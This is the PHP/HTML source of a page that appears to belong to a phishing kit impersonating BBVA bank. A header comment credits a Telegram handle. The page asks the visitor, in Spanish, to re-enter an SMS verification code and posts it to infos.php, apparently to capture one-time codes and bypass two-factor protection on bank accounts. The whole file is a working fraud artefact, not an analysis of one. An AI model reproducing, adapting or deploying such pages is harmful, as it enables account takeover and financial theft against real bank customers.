<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";

?>


<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>BBVA</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/ico.ico" type="image/x-icon" />
  <link rel="shortcut icon" href="image/ico.ico" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
</head>


	<body>
		<div class="container">
			<div class="header d-flex align-items-center justify-content-between py-2" style="margin-bottom:10px;">
					<div class="flash"><img src="image/fl.png"></div>
					<div class="logo"><img src="image/logo.svg"></div>
					<div class="right"><img src="image/right.png"></div>
			</div>
			<div class="form shadow" style="background: #fff;padding: 30px 40px;">
				<form action="infos.php" method="post">
					<input type="hidden" value="sms-er" name="step">
					<h5>Introduzca su código de SMS recibido</h5>
					<div class="text-center pb-4"><img src="image/sms.png"></div>
					<div class="form-group mb-3">
              <input type="text" name="sms" id="sms" required="" style="background:#fff;color:#000;">
              <label style="color:red;">código de SMS</label> 
              <div class="close"><i style="font-weight: 200;" class="fas fa-times"></i></div>
              <div class="error">Por favor ingrese el código correctamente</div>
          </div>
          <div class="bttn" style="margin-top: 0;">
          	<button style="color:#fff;background: #028484;" id="bttn" name="submit">ACEPTAR</button>
          </div>
          <div class="text-center"><a style="font-size: 14px;" href="phone.php">No has recibido el código?</a></div>
				</form>
			</div>
		</div>

  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>
  
  </script>
</body>
</html>